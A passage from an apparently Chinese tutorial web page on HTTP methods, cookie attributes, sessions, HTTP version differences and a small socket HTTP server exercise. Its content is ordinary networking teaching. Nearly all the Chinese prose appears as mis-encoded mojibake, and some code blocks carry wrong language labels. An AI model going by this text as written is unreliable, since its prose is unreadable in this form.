class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs ldif">ä½œç”¨ï¼š<br>æŸ¥è¯¢æ”¯æŒçš„æ–¹æ³•<br><br>ç‰¹ç‚¹ï¼š<br><span class="hljs-literal">-</span> ç”¨äºCORSé¢„æ£€è¯·æ±‚<br><span class="hljs-literal">-</span> è¿”å›Allowå¤´éƒ¨<br><br>ç¤ºä¾‹ï¼š<br>OPTIONS /api/users HTTP/1.1<br><span class="hljs-attribute">Host</span>: api.example.com<br><br>å“åº”ï¼š<br>HTTP/1.1 200 OK<br><span class="hljs-attribute">Allow</span>: GET, POST, PUT, DELETE, OPTIONS<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-literal">-</span> CORSé¢„æ£€<br><span class="hljs-literal">-</span> æœåŠ¡å‘ç°<br></code></pre></td></tr></table></figure><h3 id="4-8-æ–¹æ³•å¯¹æ¯”"><a href="#4-8-æ–¹æ³•å¯¹æ¯”" class="headerlink" title="4.8 æ–¹æ³•å¯¹æ¯”"></a>4.8 æ–¹æ³•å¯¹æ¯”</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  æ–¹æ³•  â”‚  å¹‚ç­‰  â”‚  å®‰å…¨  â”‚ å¯ç¼“å­˜ â”‚    ç”¨é€”      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  <span class="hljs-keyword">GET</span>   â”‚   âœ…   â”‚   âœ…   â”‚   âœ…   â”‚  æŸ¥è¯¢        â”‚<br>â”‚  POST  â”‚   âŒ   â”‚   âŒ   â”‚   âŒ   â”‚  åˆ›å»º        â”‚<br>â”‚  PUT   â”‚   âœ…   â”‚   âŒ   â”‚   âŒ   â”‚  å®Œæ•´æ›´æ–°    â”‚<br>â”‚  PATCH â”‚   âŒ   â”‚   âŒ   â”‚   âŒ   â”‚  éƒ¨åˆ†æ›´æ–°    â”‚<br>â”‚  <span class="hljs-keyword">DELETE</span>â”‚   âœ…   â”‚   âŒ   â”‚   âŒ   â”‚  åˆ é™¤        â”‚<br>â”‚  HEAD  â”‚   âœ…   â”‚   âœ…   â”‚   âœ…   â”‚  è·å–å¤´éƒ¨    â”‚<br>â”‚ <span class="hljs-keyword">OPTIONS</span>â”‚   âœ…   â”‚   âœ…   â”‚   âŒ   â”‚  æŸ¥è¯¢æ–¹æ³•    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å¹‚ç­‰æ€§ï¼šå¤šæ¬¡è¯·æ±‚ç»“æœç›¸åŒ<br>å®‰å…¨æ€§ï¼šä¸ä¿®æ”¹æœåŠ¡å™¨çŠ¶æ€<br></code></pre></td></tr></table></figure><hr><h2 id="5-Cookieå’ŒSession"><a href="#5-Cookieå’ŒSession" class="headerlink" title="5. Cookieå’ŒSession"></a>5. Cookieå’ŒSession</h2><h3 id="5-1-ä¸ºä»€ä¹ˆéœ€è¦Cookieï¼Ÿ"><a href="#5-1-ä¸ºä»€ä¹ˆéœ€è¦Cookieï¼Ÿ" class="headerlink" title="5.1 ä¸ºä»€ä¹ˆéœ€è¦Cookieï¼Ÿ"></a>5.1 ä¸ºä»€ä¹ˆéœ€è¦Cookieï¼Ÿ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é—®é¢˜ï¼š<br>HTTPæ˜¯æ— çŠ¶æ€çš„<br>â†’ æœåŠ¡å™¨æ— æ³•è¯†åˆ«ç”¨æˆ·<br>â†’ æ— æ³•ä¿æŒç™»å½•çŠ¶æ€<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>Cookie = å®¢æˆ·ç«¯å­˜å‚¨çš„å°æ•°æ®<br><br>å·¥ä½œæµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> ç”¨æˆ·ç™»å½•æˆåŠŸ<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨è¿”å›Set-Cookieå¤´<br><span class="hljs-bullet">3.</span> æµè§ˆå™¨ä¿å­˜Cookie<br><span class="hljs-bullet">4.</span> åç»­è¯·æ±‚è‡ªåŠ¨å¸¦ä¸ŠCookie<br><span class="hljs-bullet">5.</span> æœåŠ¡å™¨è¯†åˆ«ç”¨æˆ·<br></code></pre></td></tr></table></figure><h3 id="5-2-Cookieè¯¦è§£"><a href="#5-2-Cookieè¯¦è§£" class="headerlink" title="5.2 Cookieè¯¦è§£"></a>5.2 Cookieè¯¦è§£</h3><p><strong>è®¾ç½®Cookie</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æœåŠ¡å™¨å“åº”ï¼š<br>HTTP/1.1 200 OK<br>Set-Cookie: <span class="hljs-attribute">session_id</span>=abc123; <span class="hljs-attribute">Path</span>=/; HttpOnly; Secure<br>Set-Cookie: <span class="hljs-attribute">user</span>=Alice; <span class="hljs-attribute">Max-Age</span>=86400<br><br>å®¢æˆ·ç«¯åç»­è¯·æ±‚ï¼š<br><span class="hljs-built_in">GET</span> /api<span class="hljs-built_in">/profile </span>HTTP/1.1<br>Cookie: <span class="hljs-attribute">session_id</span>=abc123; <span class="hljs-attribute">user</span>=Alice<br></code></pre></td></tr></table></figure><p><strong>Cookieå±æ€§</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Name=Value<br><span class="hljs-bullet">  -</span> Cookieçš„é”®å€¼å¯¹<br><br>Expires=Wed, 21 Oct 2025 07:28:00 GMT<br><span class="hljs-bullet">  -</span> è¿‡æœŸæ—¶é—´ï¼ˆç»å¯¹æ—¶é—´ï¼‰<br><br>Max-Age=3600<br><span class="hljs-bullet">  -</span> æœ‰æ•ˆæœŸï¼ˆç§’æ•°ï¼Œç›¸å¯¹æ—¶é—´ï¼‰<br><br>Domain=.example.com<br><span class="hljs-bullet">  -</span> ç”Ÿæ•ˆåŸŸå<br><span class="hljs-bullet">  -</span> .example.comï¼šæ‰€æœ‰å­åŸŸåéƒ½ç”Ÿæ•ˆ<br><br>Path=/<br><span class="hljs-bullet">  -</span> ç”Ÿæ•ˆè·¯å¾„<br><span class="hljs-bullet">  -</span> /ï¼šæ‰€æœ‰è·¯å¾„<br><span class="hljs-bullet">  -</span> /apiï¼šåªåœ¨/apiè·¯å¾„ä¸‹ç”Ÿæ•ˆ<br><br>Secure<br><span class="hljs-bullet">  -</span> åªåœ¨HTTPSä¸‹ä¼ è¾“<br><br>HttpOnly<br><span class="hljs-bullet">  -</span> ç¦æ­¢JavaScriptè®¿é—®<br><span class="hljs-bullet">  -</span> é˜²æ­¢XSSæ”»å‡»<br><br>SameSite=Strict<br><span class="hljs-bullet">  -</span> Strictï¼šå®Œå…¨ç¦æ­¢è·¨ç«™å‘é€<br><span class="hljs-bullet">  -</span> Laxï¼šå¤§éƒ¨åˆ†æƒ…å†µç¦æ­¢<br><span class="hljs-bullet">  -</span> Noneï¼šå…è®¸è·¨ç«™ï¼ˆéœ€è¦Secureï¼‰<br><span class="hljs-bullet">  -</span> é˜²æ­¢CSRFæ”»å‡»<br></code></pre></td></tr></table></figure><p><strong>Cookieç¤ºä¾‹</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è®¾ç½®æ™®é€šCookie</span><br><span class="hljs-type">Set</span>-Cookie: user=Alice<br><br><span class="hljs-comment"># è®¾ç½®è¿‡æœŸCookieï¼ˆ30å¤©ï¼‰</span><br><span class="hljs-type">Set</span>-Cookie: user=Alice; Max-Age=<span class="hljs-number">2592000</span><br><br><span class="hljs-comment"># è®¾ç½®å®‰å…¨Cookie</span><br><span class="hljs-type">Set</span>-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict<br></code></pre></td></tr></table></figure><h3 id="5-3-Sessionè¯¦è§£"><a href="#5-3-Sessionè¯¦è§£" class="headerlink" title="5.3 Sessionè¯¦è§£"></a>5.3 Sessionè¯¦è§£</h3><p><strong>Sessionå·¥ä½œåŸç†</strong>ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">æµç¨‹ï¼š<br><br><span class="hljs-number">1.</span> ç”¨æˆ·ç™»å½•<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br>   POST /api/<span class="hljs-keyword">login</span><br>   &#123;&quot;username&quot;: &quot;Alice&quot;, &quot;password&quot;: &quot;***&quot;&#125;<br><br><span class="hljs-number">2.</span> æœåŠ¡å™¨éªŒè¯æˆåŠŸ<br>   - åˆ›å»º<span class="hljs-keyword">Session</span>ï¼ˆæœåŠ¡å™¨å†…å­˜/æ•°æ®åº“ï¼‰<br>   - <span class="hljs-keyword">Session</span> ID: abc123<br>   - <span class="hljs-keyword">Session</span>æ•°æ®: &#123;user_id: <span class="hljs-number">1</span>, username: &quot;Alice&quot;&#125;<br><br><span class="hljs-number">3.</span> è¿”å›<span class="hljs-keyword">Session</span> ID<br>   &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br>   <span class="hljs-keyword">Set</span>-Cookie: session_id=abc123; HttpOnly<br><br><span class="hljs-number">4.</span> åç»­è¯·æ±‚å¸¦ä¸ŠCookie<br>   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;<br>   <span class="hljs-keyword">GET</span> /api/profile<br>   Cookie: session_id=abc123<br><br><span class="hljs-number">5.</span> æœåŠ¡å™¨æŸ¥æ‰¾<span class="hljs-keyword">Session</span><br>   - æ ¹æ®session_idæŸ¥æ‰¾<span class="hljs-keyword">Session</span>æ•°æ®<br>   - è·å–ç”¨æˆ·ä¿¡æ¯<br>   - è¿”å›ç”¨æˆ·èµ„æ–™<br></code></pre></td></tr></table></figure><p><strong>Cookie vs Session</strong>ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   ç‰¹æ€§     â”‚     Cookie     â”‚     <span class="hljs-keyword">Session</span>    â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  å­˜å‚¨ä½ç½®  â”‚   å®¢æˆ·ç«¯       â”‚   æœåŠ¡å™¨       â”‚<br>â”‚  å®‰å…¨æ€§    â”‚   è¾ƒä½         â”‚   è¾ƒé«˜         â”‚<br>â”‚  å®¹é‡é™åˆ¶  â”‚   <span class="hljs-number">4</span>KB          â”‚   æ— é™åˆ¶       â”‚<br>â”‚  æ€§èƒ½      â”‚   æ— å‹åŠ›       â”‚   å ç”¨å†…å­˜     â”‚<br>â”‚  ç”Ÿå‘½å‘¨æœŸ  â”‚   å¯æŒä¹…åŒ–     â”‚   å…³é—­æµè§ˆå™¨å¤±æ•ˆâ”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>å®é™…åº”ç”¨ï¼š<br>Cookieå­˜å‚¨<span class="hljs-keyword">Session</span> ID<br><span class="hljs-keyword">Session</span>å­˜å‚¨ç”¨æˆ·æ•°æ®<br></code></pre></td></tr></table></figure><hr><h2 id="6-HTTPç‰ˆæœ¬æ¼”è¿›"><a href="#6-HTTPç‰ˆæœ¬æ¼”è¿›" class="headerlink" title="6. HTTPç‰ˆæœ¬æ¼”è¿›"></a>6. HTTPç‰ˆæœ¬æ¼”è¿›</h2><h3 id="6-1-HTTP-1-0"><a href="#6-1-HTTP-1-0" class="headerlink" title="6.1 HTTP&#x2F;1.0"></a>6.1 HTTP&#x2F;1.0</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>æ¯ä¸ªè¯·æ±‚éƒ½è¦å»ºç«‹æ–°çš„TCPè¿æ¥<br><span class="hljs-bullet">- </span>è¯·æ±‚å®Œæˆåç«‹å³å…³é—­è¿æ¥<br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">- </span>æ€§èƒ½å·®ï¼ˆTCPä¸‰æ¬¡æ¡æ‰‹å¼€é”€ï¼‰<br><span class="hljs-bullet">- </span>æ— æ³•å¤ç”¨è¿æ¥<br><br>ç¤ºä¾‹ï¼š<br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šå»ºç«‹è¿æ¥<br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šGET /page1.html<br>æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šè¿”å›page1.html<br>æ–­å¼€è¿æ¥<br><br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šå»ºç«‹è¿æ¥<br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šGET /page2.html<br>æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šè¿”å›page2.html<br>æ–­å¼€è¿æ¥<br></code></pre></td></tr></table></figure><h3 id="6-2-HTTP-1-1"><a href="#6-2-HTTP-1-1" class="headerlink" title="6.2 HTTP&#x2F;1.1"></a>6.2 HTTP&#x2F;1.1</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">æ”¹è¿›ï¼š<br>âœ… æŒä¹…è¿æ¥ï¼ˆConnection: keep-aliveï¼‰<br>âœ… ç®¡é“åŒ–ï¼ˆPipeliningï¼‰<br>âœ… åˆ†å—ä¼ è¾“ï¼ˆChunked Transferï¼‰<br>âœ… ç¼“å­˜æ§åˆ¶å¢å¼º<br>âœ… Hostå¤´éƒ¨ï¼ˆæ”¯æŒè™šæ‹Ÿä¸»æœºï¼‰<br><br>æŒä¹…è¿æ¥ï¼š<br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šå»ºç«‹è¿æ¥<br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šGET <span class="hljs-string">/page1.html</span><br>æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šè¿”å›page1.html<br>å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šGET <span class="hljs-string">/page2.html</span><br>æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šè¿”å›page2.html<br><span class="hljs-string">...</span> ä¿æŒè¿æ¥ <span class="hljs-string">...</span><br><br>é—®é¢˜ï¼š<br>- é˜Ÿå¤´é˜»å¡ï¼ˆHead-of-Line Blockingï¼‰<br>- ä¸€ä¸ªè¯·æ±‚æ…¢ä¼šé˜»å¡åç»­è¯·æ±‚<br></code></pre></td></tr></table></figure><h3 id="6-3-HTTP-2"><a href="#6-3-HTTP-2" class="headerlink" title="6.3 HTTP&#x2F;2"></a>6.3 HTTP&#x2F;2</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æ”¹è¿›ï¼š<br>âœ… äºŒè¿›åˆ¶åè®®ï¼ˆä¸å†æ˜¯æ–‡æœ¬ï¼‰<br>âœ… å¤šè·¯å¤ç”¨ï¼ˆMultiplexingï¼‰<br>âœ… å¤´éƒ¨å‹ç¼©ï¼ˆHPACKï¼‰<br>âœ… æœåŠ¡å™¨æ¨é€ï¼ˆServer Pushï¼‰<br>âœ… æµä¼˜å…ˆçº§<br><br>å¤šè·¯å¤ç”¨ï¼š<br>ä¸€ä¸ªTCPè¿æ¥ï¼Œå¤šä¸ªè¯·æ±‚å¹¶è¡Œ<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚      TCPè¿æ¥             â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ Stream 1: <span class="hljs-built_in">GET</span> /page1    â”‚<br>â”‚ Stream 2: <span class="hljs-built_in">GET</span> /style.cssâ”‚<br>â”‚ Stream 3: <span class="hljs-built_in">GET</span> /script.jsâ”‚<br>â”‚ Stream 4: <span class="hljs-built_in">GET</span> /image.jpgâ”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä¼˜ç‚¹ï¼š<br>- è§£å†³é˜Ÿå¤´é˜»å¡<br>- å‡å°‘å»¶è¿Ÿ<br>- æé«˜æ€§èƒ½<br></code></pre></td></tr></table></figure><h3 id="6-4-HTTP-3"><a href="#6-4-HTTP-3" class="headerlink" title="6.4 HTTP&#x2F;3"></a>6.4 HTTP&#x2F;3</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ”¹è¿›ï¼š<br>âœ… åŸºäºQUICï¼ˆUDPï¼‰<br>âœ… æ›´å¿«çš„è¿æ¥å»ºç«‹<br>âœ… æ›´å¥½çš„æ‹¥å¡æ§åˆ¶<br>âœ… è¿æ¥è¿ç§»ï¼ˆIPå˜åŒ–ä¸æ–­çº¿ï¼‰<br><br>ä¸ºä»€ä¹ˆç”¨UDPï¼Ÿ<br><span class="hljs-bullet">- </span>TCPé˜Ÿå¤´é˜»å¡æ— æ³•å½»åº•è§£å†³<br><span class="hljs-bullet">- </span>UDPæ›´çµæ´»<br><span class="hljs-bullet">- </span>QUICåœ¨åº”ç”¨å±‚å®ç°å¯é ä¼ è¾“<br><br>å¯¹æ¯”ï¼š<br>HTTP/1.1ï¼šæ–‡æœ¬ + TCP<br>HTTP/2ï¼šäºŒè¿›åˆ¶ + TCP<br>HTTP/3ï¼šäºŒè¿›åˆ¶ + QUIC(UDP)<br></code></pre></td></tr></table></figure><h3 id="6-5-ç‰ˆæœ¬å¯¹æ¯”"><a href="#6-5-ç‰ˆæœ¬å¯¹æ¯”" class="headerlink" title="6.5 ç‰ˆæœ¬å¯¹æ¯”"></a>6.5 ç‰ˆæœ¬å¯¹æ¯”</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   ç‰¹æ€§     â”‚ HTTP<span class="hljs-symbol">/1.1</span> â”‚  HTTP<span class="hljs-symbol">/2</span>  â”‚  HTTP<span class="hljs-symbol">/3</span>  â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  åè®®      â”‚   æ–‡æœ¬   â”‚  äºŒè¿›åˆ¶  â”‚  äºŒè¿›åˆ¶  â”‚<br>â”‚  ä¼ è¾“å±‚    â”‚   TCP    â”‚   TCP    â”‚  QUIC    â”‚<br>â”‚  å¤šè·¯å¤ç”¨  â”‚    âŒ    â”‚    âœ…    â”‚    âœ…    â”‚<br>â”‚  å¤´éƒ¨å‹ç¼©  â”‚    âŒ    â”‚    âœ…    â”‚    âœ…    â”‚<br>â”‚  æœåŠ¡å™¨æ¨é€â”‚    âŒ    â”‚    âœ…    â”‚    âœ…    â”‚<br>â”‚  è¿æ¥å»ºç«‹  â”‚   æ…¢     â”‚   ä¸­ç­‰   â”‚   å¿«     â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="7-å®æˆ˜é¡¹ç›®ï¼šç®€å•HTTPæœåŠ¡å™¨"><a href="#7-å®æˆ˜é¡¹ç›®ï¼šç®€å•HTTPæœåŠ¡å™¨" class="headerlink" title="7. å®æˆ˜é¡¹ç›®ï¼šç®€å•HTTPæœåŠ¡å™¨"></a>7. å®æˆ˜é¡¹ç›®ï¼šç®€å•HTTPæœåŠ¡å™¨</h2><h3 id="7-1-é¡¹ç›®éœ€æ±‚"><a href="#7-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="7.1 é¡¹ç›®éœ€æ±‚"></a>7.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> æ”¯æŒGET/POSTè¯·æ±‚<br><span class="hljs-bullet">2.</span> è§£æHTTPè¯·æ±‚<br><span class="hljs-bullet">3.</span> è¿”å›HTTPå“åº”<br><span class="hljs-bullet">4.</span> æ”¯æŒé™æ€æ–‡ä»¶æœåŠ¡<br><span class="hljs-bullet">5.</span> æ”¯æŒJSON API<br><span class="hljs-bullet">6.</span> æ—¥å¿—è®°å½•<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> ä½¿ç”¨Socketå®ç°<br><span class="hljs-bullet">-</span> éµå¾ªHTTP/1.1åè®®<br><span class="hljs-bullet">-</span> æ”¯æŒContent-Typeè¯†åˆ«<br><span class="hljs-bullet">-</span> æ”¯æŒåŸºæœ¬çš„é”™è¯¯å¤„ç†<br></code></pre></td></tr></table></figure><h3 id="7-2-å·¥å…·æ¼”ç¤º"><a href="#7-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="7.2 å·¥å…·æ¼”ç¤º"></a>7.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯åŠ¨HTTPæœåŠ¡å™¨</span><br>python day19_http_server.py --host 0.0.0.0 --port 8080<br><br><span class="hljs-comment"># æµ‹è¯•HTTPå®¢æˆ·ç«¯</span><br>python day19_http_client.py --url http://127.0.0.1:8080/<br><br><span class="hljs-comment"># æµè§ˆå™¨è®¿é—®</span><br>open http://127.0.0.1:8080/<br></code></pre></td></tr></table></figure><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ "><a href="#8-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="8. ä»Šæ—¥ç»ƒä¹ "></a>8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šæ‰‹åŠ¨æ„å»ºHTTPè¯·æ±‚"><a href="#ç»ƒä¹ 1ï¼šæ‰‹åŠ¨æ„å»ºHTTPè¯·æ±‚" class="headerlink" title="ç»ƒä¹ 1ï¼šæ‰‹åŠ¨æ„å»ºHTTPè¯·æ±‚"></a>ç»ƒä¹ 1ï¼šæ‰‹åŠ¨æ„å»ºHTTPè¯·æ±‚</h3><figure class="highlight python"><table><tr><td 